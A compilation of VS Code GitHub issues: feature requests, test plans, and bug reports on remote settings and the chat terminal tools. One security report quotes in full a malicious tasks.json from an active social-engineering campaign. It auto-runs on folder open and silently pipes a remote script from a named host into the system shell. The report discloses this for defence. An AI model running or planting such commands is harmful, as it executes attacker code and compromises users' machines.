Title: Feature request: locale-aware loading for chatSkills contributions

Description:

Type: <b>Feature Request</b>

## Feature request

I would like VS Code to support locale-aware loading of `chatSkills` contributions, so an extension can expose different skill files depending on the user's UI language.

### Problem
`chatSkills` is currently a static manifest contribution. If an extension wants to provide user guidance for Copilot in both English and Chinese, it has to either:

- ship one bilingual skill file, or
- manually duplicate skill files and rely on naming/description matching.

This is workable, but it is not ideal for maintainability or user experience. In my case, I have an extension that exposes MCP tools to Copilot, and I want to provide a skill that explains how to use those tools. I would prefer to load a Chinese skill for Chinese UI users and an English skill for English UI users automatically.

### Expected behavior
It would be helpful if VS Code allowed one of the following:

1. Conditional `chatSkills` contributions based on locale or user language, or
2. A localization mechanism for skill selection similar to `package.nls.json`, or
3. Support for a locale-aware `path`/`description` resolution for `chatSkills`.

### Why this matters
- It keeps skill content concise and language-specific.
- It avoids mixing two languages in one skill file.
- It improves discoverability for Copilot users in localized environments.
- It makes extension packaging cleaner for multilingual extensions.

### Current workaround
The current workaround is to keep one bilingual skill file or create multiple skills and duplicate the instructions. That is acceptable, but not ideal.

### Additional context
The extension API already supports localized manifest strings via `package.nls.json`, and VS Code exposes the user language via `vscode.env.language`. A similar mechanism for `chatSkills` would make localized Copilot guidance much cleaner.

Thanks for considering this.

VS Code version: Code 1.115.0 (41dd792b5e652393e7787322889ed5fdc58bd75b, 2026-04-07T22:04:57Z)
OS version: Windows_NT x64 10.0.26200
Modes:


<!-- generated by issue reporter -->

Comments:
<!-- 6d457af9-96bd-47a8-a0e8-ecf120dfffc1 -->
This feature request is now a candidate for our backlog. The community has 60 days to [upvote](https://github.com/microsoft/vscode/wiki/Issues-Triaging#up-voting-a-feature-request) the issue. If it receives 20 upvotes we will move it to our backlog. If not, we will close it. To learn more about how we handle feature requests, please see our [documentation](https://aka.ms/vscode-issue-lifecycle).

Happy Coding!

Title: Feature Request: Allow `task.allowAutomaticTasks` to be set at the workspace level

Description:
<!-- ⚠️⚠️ Do Not Delete This! feature_request_template ⚠️⚠️ -->
<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->
<!-- Please search existing issues to avoid creating duplicates. -->

<!-- Describe the feature you'd like. -->

Currently, `task.allowAutomaticTasks` is restricted to User (global) settings. This creates an "all-or-nothing" dilemma that severely limits workflow flexibility for developers. I strongly propose allowing this setting to be configured or overridden at the Workspace level (in `.vscode/settings.json`).

1. **Workspace Trust $\neq$ Automatic Execution**
   Workspace Trust is a broad security boundary. Just because I trust a workspace (meaning I am okay with language servers running or manually executing scripts) does not mean I want background tasks—like local servers, watchers, or build scripts—to spin up automatically the moment I open the folder. Coupling these two concepts is counter-productive.
2. **Security and Global Risks**
   Automatic task execution is, by definition, automated arbitrary code execution. Having this as a global setting means that if turned on, *all* trusted workspaces instantly get permission to automatically run code upon opening. This violates the principle of least privilege. Scoping this to the workspace level isolates the risk and better protects the user.
3. **The Need for Fine-Grained Control**
   Different projects require completely different workflows. The previous mechanism (which allowed folder-level authorization for automatic tasks) was excellent because it provided fine-grained control. For certain high-frequency personal projects, automatic tasks are essential; for open-source repositories I only occasionally review, I want the workspace to remain completely static upon opening. The current global approach strips away this flexibility.
4. **Request for Design Rationale**
   I would appreciate it if the team could explain the design rationale behind restricting this to a global setting. The current implementation feels like a suboptimal compromise between security and convenience. Understanding the reasoning behind this architectural choice would be highly beneficial to the community. @meganrogge Can you explain it? I found you make the changes.

**Expected Behavior:**
`task.allowAutomaticTasks` should be valid as a `workspace` setting in `settings.json`, and it should take precedence over the global User setting.

Comments:
<!-- 6d457af9-96bd-47a8-a0e8-ecf120dfffc1 -->
This feature request is now a candidate for our backlog. The community has 60 days to [upvote](https://github.com/microsoft/vscode/wiki/Issues-Triaging#up-voting-a-feature-request) the issue. If it receives 20 upvotes we will move it to our backlog. If not, we will close it. To learn more about how we handle feature requests, please see our [documentation](https://aka.ms/vscode-issue-lifecycle).

Happy Coding!
<!-- 9078ab2c-c9e0-7adb-d31b-1f23430222f4 -->
:slightly_smiling_face: This feature request received a sufficient number of community upvotes and we moved it to our backlog. To learn more about how we handle feature requests, please see our [documentation](https://aka.ms/vscode-issue-lifecycle).

Happy Coding!

Title: Security: .vscode/tasks.json with runOn: folderOpen enables silent arbitrary code execution from cloned repositories

Description:
Does this issue occur when all extensions are disabled?: Yes

- VS Code Version: all versions supporting `runOn: folderOpen` in tasks.json
- OS Version: Linux / macOS / Windows (all targeted)

Steps to Reproduce:

1. Clone the repository `https://github.com/Brjanzake/Jackpot_1`
2. Open the cloned folder in VS Code

**What happens:** A shell task with `"runOn": "folderOpen"` executes immediately and silently. It downloads and pipes a remote script to the system shell (`wget | sh` on Linux, `curl | bash` on macOS, `curl | cmd` on Windows) from `https://vscode-ip-checking-nine.vercel.app/api/settings/{os}`. The task's `presentation` is configured to be completely invisible to the user (`reveal: silent`, `echo: false`, `focus: false`, `close: true`).

No extensions are involved — this uses only the built-in Tasks functionality.

**The malicious `.vscode/tasks.json`:**

```json
{
  "label": "env",
  "type": "shell",
  "linux": {
    "command": "wget -qO- 'https://vscode-ip-checking-nine.vercel.app/api/settings/linux' | sh"
  },
  "osx": {
    "command": "curl -L 'https://vscode-ip-checking-nine.vercel.app/api/settings/mac' | bash"
  },
  "windows": {
    "command": "curl --ssl-no-revoke -L https://vscode-ip-checking-nine.vercel.app/api/settings/windows | cmd"
  },
  "runOptions": {
    "runOn": "folderOpen"
  },
  "presentation": {
    "reveal": "silent",
    "echo": false,
    "focus": false,
    "close": true,
    "panel": "new",
    "showReuseMessage": false,
    "clear": true
  }
}

Context: This is an active attack in the wild. I was targeted through a social engineering campaign (LinkedIn contact → scheduled video call → asked to clone and open this project). The .env file contains a base64-obfuscated C2 URL.

The core issue: runOn: folderOpen combined with presentation: silent allows zero-click, invisible arbitrary code execution from any cloned repository. Workspace Trust does exist but does not specifically warn about auto-executing tasks or display what commands will run.

Suggested mitigations:

Require explicit user consent before executing any runOn: folderOpen task, showing the exact command
Disallow reveal: silent for auto-run tasks
Consider blocking shell pipe patterns (| sh, | bash, | cmd) in auto-run tasks

Comments:
Thank you for your report. The team’s attempts to repro required the user to confirm in the  Workspace Trust dialog (https://code.visualstudio.com/docs/editing/workspaces/workspace-trust). After that point, it’s *By Design* that opening a directory can trigger automatic scripts.

If you’ve found a way get execution without clicking the Workspace Trust dialog on the directory (or parent directory), please report it via our official security reporting mechanisms: https://github.com/microsoft/vscode-copilot-evaluation/blob/main/SECURITY.md#reporting-security-issues

We appreciate your suggestions for additional mitigations and will discuss them with the team. Thank you!

---

Title: Test: HTTP 413 errors when using images in chat

Description:
Refs https://github.com/microsoft/vscode/pull/308901 (see list of bugs linked from there)

- [x] anyOS @alexr00 (Anthropic)
- [x] anyOS @connor4312 (OpenAI)
- [x] anyOS @bhavyaus (Google)

Complexity: 3

Authors: @dmitrivMS 

[Create Issue](https://github.com/microsoft/vscode/issues/new?template=blank&body=Testing+HTTP+413&assignees=dmitrivMS)

---

**Setup**
Create a folder with 10 or more images (PNG, but other formats work as well) of 2MB+ in size each.
Pick a web site from which you can take multiple screenshots.

Pick a model provider (one per person):
- Anthropic (Sonnet, Opus)
- OpenAI (GPT)
- Google (Gemimi)

You will be testing with models from this provider.

**Scenario**
Use AI (from chat, using the models assigned, one at a time, using latest versions) to run prompts that make chat load ALL the images (using View Image tool - make sure you see that in the chat). Ideally you want it to load multiple images in a single turn - as much as it can handle.

Your goal is to hit this error in chat:
```
Reason: Request Failed: 413 {"error":{"message":"failed to parse request","code":""}}
```

If you cannot, I succeeded.

**Ideas for Prompts**
- Ask chat to analyze all images in the folder and determine style/similarities/color contrast etc.
- Ask chat to navigate to a web site and take 10 screenshots of main pages (using Playwright) and then analyze all the screenshots for consistency/style/color contrast/etc.
- Load 10 random images from the internet into a folder, then analyze all images at once.

> Ask chat to navigate to a web site and take 10 screenshots of main pages (using Playwright) and then analyze all the screenshots for consistency/style/color contrast/etc.

Description:

Type: <b>Bug</b>

🐛 Bug Description

🗓️ Timeline
Everything was working perfectly fine before April 8th.
The issue appeared after this date.
🔧 Troubleshooting Steps Taken
I have already performed a thorough cleanup and reinstallation, but the issue persists. Here is what I have tried:
Multiple Reinstallations: Uninstalled and reinstalled VS Code multiple times.
Cleaned Directories: Manually deleted all Code and Microsoft VS Code related folders from the system.
Registry Cleanup: Cleaned the Windows Registry to remove any lingering settings.
Cleared User Extensions: Removed all installed user plugins/extensions.
Fresh Install: Downloaded and installed the latest 0.115.0 User Installer version.
Despite these steps, the built-in extensions still do not load.
ℹ️ System Info
VS Code Version: 0.115.0 (User Setup)
OS: Windows
Last working version: Pre-April 8, 2026

Title: `remote.extensionKind` ignored from workspace/.vscode/settings.json and devcontainer Machine settings (only works from user settings)

Description:
<!-- ⚠️⚠️ Do Not Delete This! bug_report_template ⚠️⚠️ -->
<!-- Please read our Rules of Conduct: https://opensource.microsoft.com/codeofconduct/ -->
<!-- 🕮 Read our guide about submitting issues: https://github.com/microsoft/vscode/wiki/Submitting-Bugs-and-Suggestions -->
<!-- 🔎 Search existing issues to avoid creating duplicates. -->
<!-- 🧪 Test using the latest Insiders build to see if your issue has already been fixed: https://code.visualstudio.com/insiders/ -->
<!-- 💡 Instead of creating your report here, use 'Report Issue' from the 'Help' menu in VS Code to pre-fill useful information. -->
<!-- 🔧 Launch with `code --disable-extensions` to check. -->
Does this issue occur when all extensions are disabled?: N/A (this is about extension placement, not a specific extension)

- VS Code Version: 1.115.0 (41dd792b5e652393e7787322889ed5fdc58bd75b)
- OS Version: macOS 15.6 (arm64)
- Dev Containers Extension Version: 0.447.0

## Bug Summary

`remote.extensionKind` is registered with **no explicit `scope`** (defaults to `ConfigurationScope.WINDOW`), and the [documentation for `WINDOW` scope](https://github.com/microsoft/vscode/blob/main/src/vs/platform/configuration/common/configurationRegistry.ts#L147) states:

> Window specific configuration, which can be configured in the **user or workspace settings**.

However, when using Dev Containers, `remote.extensionKind` **only takes effect from user settings**. Setting it in `.vscode/settings.json` (workspace settings) or via `customizations.vscode.settings` in `devcontainer.json` (which writes to the container's Machine settings at `/root/.vscode-server/data/Machine/settings.json`) has **no effect**.

## Steps to Reproduce

1. Create a project with a `.devcontainer/devcontainer.json`:
   ```jsonc
   {
     "image": "mcr.microsoft.com/devcontainers/typescript-node:18",
     "customizations": {
       "vscode": {
         "settings": {
           "remote.extensionKind": {
             "GitHub.copilot": ["ui"],
             "GitHub.copilot-chat": ["ui"]
           }
         }
       }
     }
   }
   ```

2. Also add the same setting in `.vscode/settings.json`:
   ```json
   {
     "remote.extensionKind": {
       "GitHub.copilot": ["ui"],
       "GitHub.copilot-chat": ["ui"]
     }
   }
   ```

3. Make sure **user settings** (`~/Library/Application Support/Code/User/settings.json` on macOS) does **NOT** contain `remote.extensionKind`.

4. Reopen the project in the Dev Container.

5. Run `Developer: Show Running Extensions` — observe that GitHub Copilot and GitHub Copilot Chat are running in the **Remote Extension Host** (workspace side), not the local UI side.

6. Now add the same `remote.extensionKind` to **user settings**, rebuild/reopen the container — the extensions correctly run on the **UI (local)** side.

## Expected Behavior

`remote.extensionKind` should be honored from all `ConfigurationScope.WINDOW`-eligible sources:
- User settings ✅ (works)
- Workspace `.vscode/settings.json` ❌ (ignored)
- Container Machine settings (via `customizations.vscode.settings`) ❌ (ignored)

## Actual Behavior

Only user settings are effective. Workspace settings and container Machine settings are ignored.

## Root Cause Analysis (from source code)

I traced through the source to understand why:

1. **Extension kind resolution timing** — In [`nativeExtensionService.ts` → `_doResolveExtensions()`](https://github.com/microsoft/vscode/blob/main/src/vs/workbench/services/extensions/electron-browser/nativeExtensionService.ts), the flow is:
   - Connect to container → remote filesystem becomes available
   - `_remoteExtensionsScannerService.scanExtensions()` fetches remote extensions
   - `initializeRunningLocation()` is called, which calls `readExtensionKinds()` → [`extensionManifestPropertiesService.getExtensionKind()`](https://github.com/microsoft/vscode/blob/main/src/vs/workbench/services/extensions/common/extensionManifestPropertiesService.ts#L142) → `configurationService.getValue('remote.extensionKind')`

2. **Race condition** — At the point `getValue('remote.extensionKind')` is called, the `ConfigurationService` has synchronously loaded user settings (from the local filesystem), but the **remote Machine settings** and **workspace settings** (read via remote FS provider) may not have been loaded yet. So `getValue()` returns only the user settings value.

3. **Evidence from Dev Container log** — The container log confirms the Machine settings file exists and contains the correct value:
   ```
   [3081 ms] Start: Run in container: cat /root/.vscode-server/data/Machine/settings.json
   → { "remote.extensionKind": { "GitHub.copilot": ["ui"], "GitHub.copilot-chat": ["ui"] } ... }
   ```
   But the extension kind decision has already been made by this point.

## Suggested Fix

A few possible approaches:

1. **Ensure remote configuration sources are loaded before `initializeRunningLocation()`** — Add an explicit `await` for configuration initialization from remote sources before calling `getValue('remote.extensionKind')`.

2. **Change `remote.extensionKind` scope to `APPLICATION`** — If it's intentionally only meant to work from user settings, update the scope to accurately reflect this (and update docs accordingly).

3. **Read `remote.extensionKind` with `inspect()` and explicitly merge** — Instead of relying on `getValue()` timing, use `configurationService.inspect('remote.extensionKind')` and explicitly read from workspace/machine settings files that have already been transferred to the local side during container setup.

## Why This Matters

Teams want a zero-config solution: commit `remote.extensionKind` in `.vscode/settings.json` so all team members automatically get the correct extension placement in Dev Containers. Currently, every developer must manually add this to their personal user settings, which is error-prone and undiscoverable.

Comments:

**Key observation**: At `[3081 ms]`, the Machine settings file at `/root/.vscode-server/data/Machine/settings.json` already contains `"remote.extensionKind"` with the correct values. However, the VS Code Server starts at `[4158 ms]` and the Extension Host launches at `[5735 ms]` — by which time the extension kind decision has already been made using only the (empty) user settings value.

---

### Log 2: GitHub Copilot Chat Extension Log (Remote Extension Host)

Shows the Copilot Chat extension running inside the container (Remote Extension Host), failing to fetch due to the container's proxy settings (`127.0.0.1:7890`). This is the **symptom** — if `remote.extensionKind` from workspace/Machine settings had been honored, these extensions would run on the local (UI) side and wouldn't hit the container's proxy at all.

</details>

**Key observation**: The log line `"Can't use the Electron fetcher in this environment"` confirms the extension is running in the **Remote Extension Host** (container side, no Electron available). It then repeatedly fails with `ECONNREFUSED 127.0.0.1:7890` because the container doesn't have the host's proxy running. If `remote.extensionKind` had been honored from Machine/workspace settings, the extension would run on the local UI side where Electron fetcher and the proxy are available.

Title: Walkthrough: unable to see if Continue button has focus

Description:
Testing #309099

The "Continue with GitHub" button has a border that is very similar to the focus border, making it look like it always focused. In combination with the "Continue" button that has the same color as the focus border, it's difficult to see when the "Continue" button has focus when tabbing through controls.

In the following screenshot the "Continue" button has focus:

<img width="1368" height="881" alt="Image" src="https://github.com/user-attachments/assets/461016aa-9131-434a-b92c-d440b118cb95" />

This is also the case in the "Make it yours" page. Unable to distinguish when the switcher is active or not.

Title: `run_in_terminal` tool description advertises 60KB output truncation but the live code path truncates at 16KB

Description:
The `run_in_terminal` tool description tells the model it gets up to 60KB of output, but the live output-retrieval path caps at 16KB.

Tool description strings at [runInTerminalTool.ts#L135](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/runInTerminalTool.ts#L135) and [#L219](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/runInTerminalTool.ts#L219) both say:

> Output is automatically truncated if longer than 60KB to prevent context overflow

There are two `MAX_OUTPUT_LENGTH` constants with different values:

- [`runInTerminalHelpers.ts#L51`](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/runInTerminalHelpers.ts#L51) → `60000`, only used by [`sanitizeTerminalOutput`](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/runInTerminalHelpers.ts#L67), which has no non-test callers.
- [`outputHelpers.ts#L10`](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/outputHelpers.ts#L10) → `16000`, used by [`getOutput`](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/outputHelpers.ts#L12), which is the only output path reached by `runInTerminalTool`, `getTerminalOutputTool`, and `taskHelpers`.

So every `run_in_terminal` invocation that produces more than ~16KB of output returns only the last 16KB, regardless of what the tool description claims.

### User-visible implications

`truncateOutputKeepingTail` keeps the tail, so the head is what gets dropped. That's where errors usually live for `npm install`, `pip install`, `cargo build`, `pytest -v`, `git log`, etc. The agent reads a truncated tail, confidently concludes "nothing actionable in the output", and the user has to re-run or scroll up to find the real failure.

The model also plans against the wrong budget: told 60KB, it doesn't paginate or filter commands that would exceed 16KB, so the problem compounds on anything verbose.

### Shape of the fix

1. Pick one number. Either bump `outputHelpers.ts` to 60000 (or make it a setting like `chat.tools.terminal.maxOutputBytes`), or change the description strings to 16KB. The description and the truncation limit must agree.
2. Delete `sanitizeTerminalOutput` — it's dead code, and having a second `MAX_OUTPUT_LENGTH` constant in the same module is how this drift happened.


Comments:
Revised after re-reading the linked issues (previous version labelled a few "Strong" that are really same-symptom-family, not same mechanism):

| Relevance | Issue | Title | State | Why related |
|---|---|---|---|---|
| Strong | #299486 | run_in_terminal timeout silently truncates output with no signal to agent | Closed | Same class of bug: tool returns partial output with no flag, agent can't tell. That one is about the explicit `timeout` param; this one is about the 60KB-vs-16KB mismatch on the normal (non-timeout) path |
| Strong | #296887 | Terminal tool returns partial output for commands >~11s on terminals without shell integration | Closed | Same class: silent truncation with no indication to the agent. `NoneExecuteStrategy`'s 10s `extendedTimeoutMs` returns early; this issue is about `getOutput` capping at 16KB |
| Medium | #297109 | run_in_terminal tool non-deterministically truncates command output | Closed | Different mechanism (render-race between command-end marker and renderer flush) but same user-visible result: agent gets less output than the user expects |
| Medium | #282904 | Copilot Chat / Agent misses terminal output (last lines) on Windows (Git Bash + WSL) | Closed | Different mechanism (tail-dropping on Windows) but again same class — if the 16KB cap also drops content from the tail in some cases, these compound |
| Weak | #299588 | Copilot Chat repeatedly fails to read terminal output, causing retries and excessive token usage | Closed | End-user symptom (model retries because output looks empty) — could be exacerbated by the 16KB cap in some large-output cases, but no direct evidence |
| Weak | #299205 | Blind to terminal output | Open | Vague "command has output but model says none" report. Possibly amplified by the 16KB cap but not specifically about it |

The specific 60KB-in-tool-description vs 16KB-in-`outputHelpers.ts` mismatch is not covered by any of these.

Title: Consolidate terminal prompt-detection regexes — currently duplicated across `executeStrategy` and `outputMonitor`

Description:
Prompt and "waiting for input" detection lives in two places with overlapping but inconsistent regex sets:

- [`detectsCommonPromptPattern` at executeStrategy.ts#L60](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/executeStrategy/executeStrategy.ts#L60), called from the idle loop at [#L131](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/executeStrategy/executeStrategy.ts#L131)
- [`detectsInputRequiredPattern` at outputMonitor.ts#L468](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/monitoring/outputMonitor.ts#L468), [`detectsNonInteractiveHelpPattern` #L495](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/monitoring/outputMonitor.ts#L495), [`detectsVSCodeTaskFinishMessage` #L536](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/monitoring/outputMonitor.ts#L536), [`detectsGenericPressAnyKeyPattern` #L546](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/monitoring/outputMonitor.ts#L546)

Execute strategies use the first function to decide whether a command is idle. `OutputMonitor` uses the second set at [outputMonitor.ts#L288](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/monitoring/outputMonitor.ts#L288) and [#L300](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/monitoring/outputMonitor.ts#L300) to decide whether to fire `onDidDetectInputNeeded`. Both are answering facets of the same question — "is this terminal sitting at a prompt, and is it waiting for something?" — against different regex tables. A pattern added to one is not picked up by the other.

### User-visible implications

Disagreement between the two tables produces two failure modes, both on the single most visible interaction in the tool:

1. **Silent hang with a confused agent.** `executeStrategy` declares idle but `detectsInputRequiredPattern` doesn't match the shell's prompt. The tool card completes, the agent moves on, and the terminal sits unanswered at `(y/N)` / `Password:` / `(Pdb)`. User finds it later by scrolling up.
2. **Spurious "terminal needs your input" interruptions.** The reverse: `detectsInputRequiredPattern` matches something `detectsCommonPromptPattern` didn't treat as a real prompt, so the agent stops and asks the user what to type into a terminal that was just printing output.

Both symptoms look like "the agent is wrong", not like a regex drift bug, so users can't self-diagnose.

### Shape of the consolidation

- New module `promptDetection.ts` under `browser/tools/`
- Single table of `{ id, regex, category: 'prompt' | 'inputRequired' | 'taskFinish' | 'pressAnyKey' }`
- Thin wrappers `detectsCommonPromptPattern`, `detectsInputRequiredPattern`, etc. filter by category
- `promptDetection.test.ts` covering bash/zsh/fish/pwsh/cmd, `(Pdb)`, `ipdb>`, `[y/N]`, password prompts, `Press any key`
- Existing call sites re-export from the new module


Comments:
Revised after re-reading the linked issues (previous version linked a couple that only matched on title):

| Relevance | Issue | Title | State | Why related |
|---|---|---|---|---|
| Strong | #296886 | Terminal tool: "The terminal is awaiting input." fires false-positive after command completes at bash prompt | Closed | Reporter explicitly calls out that `executeStrategy.ts` has `detectsCommonPromptPattern` which correctly identifies `$` as completion, but `OutputMonitor` never consults it — the fix they propose (`import { detectsCommonPromptPattern } from '../../executeStrategy/executeStrategy.js'` and guard before the LLM call) is exactly this consolidation |
| Medium | #282933 | Agent confused by SSH key login prompt on command line | Open | SSH passphrase prompt is the canonical "terminal waiting for input that no current regex matches" case. Consolidated table would be the natural place to add it once, instead of having to add it twice and risk drift |

Dropped from the previous table:

- **#283507** — the title mentions RPS1 but the body is entirely about the assistant not waiting for `run_in_terminal` to return. Model-behavior issue, not prompt-detection regexes.
- **#288567** — about tweaks to the `isBackground` description string in the tool prompt. Unrelated to regex consolidation.

Still nothing captures the specific duplication between `executeStrategy.ts` and `outputMonitor.ts`. #296886 is the one that most directly argues for this issue's fix.

Title: `TerminalSandboxService.checkForSandboxingPrereqs` re-runs on every command rewrite

Description:
[`CommandLineSandboxRewriter.rewrite`](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/commandLineRewriter/commandLineSandboxRewriter.ts#L17) awaits `this._sandboxService.checkForSandboxingPrereqs()` on every invocation. The implementation in [`terminalSandboxService.ts#L265`](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/common/terminalSandboxService.ts#L265) does binary probing (`bwrap`, `socat`), sandbox config file reads, and JSON parsing of those files.

The prereq result is a function of installed OS binaries and sandbox settings. Neither changes between two back-to-back `run_in_terminal` invocations in the same session, so every call to `rewrite` pays for a recheck that's guaranteed to return the same answer.

Every foreground `run_in_terminal` goes through this path during `prepareToolInvocation`, before the confirmation UI renders. The cost is paid synchronously on the hot path between "user sends message" and "tool card appears".

Invalidation is bounded — a cached result is only stale if one of:

- `IConfigurationService.onDidChangeConfiguration` fires for any of the sandbox or agent network domain settings (the same list `ChatAgentToolsContribution` already listens for to re-register `runInTerminalTool`)
- `IWorkspaceContextService.onDidChangeWorkspaceFolders` fires and would change the resolved sandbox config location

Neither requires per-command evaluation.


Comments:
Revised after re-reading: I don't think there is a genuinely related existing issue for this one.

Previous version linked **#298729** (sandbox command-quoting escape) on a "same subsystem, cache invalidation would be needed" argument — that's speculative and isn't what this issue is about. Dropping it.

This is a standalone performance/debt item: `checkForSandboxingPrereqs` does binary probes + config reads on every `run_in_terminal` rewrite, and the result is a function of state that only changes on `onDidChangeConfiguration` (sandbox settings) or `onDidChangeWorkspaceFolders`. No existing issue captures that.

---

Title: OutputMonitor.continueMonitoringAsync does not cancel the previous monitoring run before starting a new one

Description:
[`OutputMonitor.continueMonitoringAsync`](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/monitoring/outputMonitor.ts#L209) starts a new monitoring run without stopping the previous one:

```ts
continueMonitoringAsync(token: CancellationToken): void {
    this._asyncMode = true;
    // Cancel and dispose any in-progress monitoring run to avoid two concurrent loops
    this._currentMonitoringCts?.dispose();
    this._currentMonitoringCts = new CancellationTokenSource(token);
    this._state = OutputMonitorState.PollingForIdle;
    this._startMonitoring(this._command, this._invocationContext, this._currentMonitoringCts.token);
}
```

The inline comment says "Cancel and dispose any in-progress monitoring run", but the previous run isn't actually cancelled. [`CancellationTokenSource.dispose()` at cancellation.ts#L128](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/base/common/cancellation.ts#L128) defaults `cancel` to `false`:

```ts
dispose(cancel: boolean = false): void {
    if (cancel) {
        this.cancel();
    }
    ...
}
```

So disposing `_currentMonitoringCts` doesn't signal cancellation to the in-flight [`_startMonitoring`](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/monitoring/outputMonitor.ts#L111) call. The old run's token stays in its original state and the loop keeps progressing through `_waitForIdle`, `_handleIdleState`, and its `finally` block.

The foreground→background handoff in `runInTerminalTool` calls `continueMonitoringAsync` while the original monitoring pass is still running. With the cancellation bug above, that path can have two monitoring runs alive at once. `OutputMonitor` keeps per-run state on the instance, so both runs share `this._state`, `this._pollingResult`, `this._userInputListener`, and the emitters.

The stale-run [`finally` at outputMonitor.ts#L187](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/monitoring/outputMonitor.ts#L187) is the strongest correctness problem:

```ts
} finally {
    this._pollingResult = {
        state: this._state,
        output: output ?? this._execution.getOutput(),
        pollDurationMs: Date.now() - pollStartTime,
        resources
    };
    this._userInputListener.clear();
    this._onDidFinishCommand.fire();
}
```

There's no ownership check against the active monitoring run. A stale run can overwrite `_pollingResult`, clear `_userInputListener`, and fire `onDidFinishCommand` after a newer run has already taken over. If it reaches one of the input-required branches at [outputMonitor.ts#L273](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/monitoring/outputMonitor.ts#L273), [#L290](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/monitoring/outputMonitor.ts#L290), or [#L302](https://github.com/microsoft/vscode/blob/1dfb3b9dd41665724360e94791708dfcab81b681/src/vs/workbench/contrib/terminalContrib/chatAgentTools/browser/tools/monitoring/outputMonitor.ts#L302) before unwinding, it can also fire `_onDidDetectInputNeeded` against the new run's state.

Scoping: the initial async-mode flow from the constructor isn't affected because the caller waits for the first monitoring pass to finish before `continueMonitoringAsync` runs. This is specifically about the foreground→background transition path in `runInTerminalTool`.


Comments:
Revised after re-reading the linked issues (previous version overreached on a few):

| Relevance | Issue | Title | State | Why related |
|---|---|---|---|---|
| Strong | #299514 | Awaiting terminal input doesnt go away | Open | Sticky "awaiting input" that persists after input was already provided, with a subagent still running — consistent with a stale monitoring run re-firing `_onDidDetectInputNeeded` against the new run's state |
| Medium | #304530 | When the agent uses the read task tool, things get stuck on "Terminal is awaiting input" | Open | Symptom (stuck on "awaiting input" after task tool) is consistent with the stale-run `finally` overwriting `_pollingResult` / firing `_onDidDetectInputNeeded` on the new run, but no direct evidence it is this race |
| Weak | #307173 | We should not be invoking the LLM in output monitor | Open | Same `OutputMonitor` class. Orthogonal mechanism, but if a stale run reaches the LLM invocation branch before unwinding, the two problems compound |
| Weak | #296886 | Terminal tool: "The terminal is awaiting input." fires false-positive after command completes at bash prompt | Closed | Same end-user symptom (unescapable "awaiting input") but a different mechanism (LLM false-positive at shell prompt). The stale-run race could still contribute if the old run reaches `_handleIdleState` after the new run resolved |
| Weak | #307201 | Background terminals that finish are not indicated to the agent | Closed | Different signaling gap (fixed), but touches the same fg→bg transition that calls `continueMonitoringAsync` |
| Weak | #288566 | Allow agent to push a terminal into the background | Open | The fg→bg push is the exact transition that calls `continueMonitoringAsync` and triggers this race |

Dropped from the previous table:

- **#309607** — actually about chat-request cancellation of background tasks (already fixed by @meganrogge in 1.117), not about `OutputMonitor.continueMonitoringAsync`. Different layer.
- **#293859** — the agent acknowledges the deploy is running and then re-issues the command anyway. That is model/prompt behavior, not `OutputMonitor` state corruption.

Title: test: new confirmation carousel v1

Description:
ref https://github.com/microsoft/vscode/issues/306186

- [x] anyOS @mjbvz 
- [x] anyOS @Giuspepe 
- [x] anyOS @hawkticehurst 

Complexity: 2


[Create Issue](https://github.com/microsoft/vscode/issues/new?template=blank&body=Testing+%23309330%0A%0A&assignees=justschen)

---

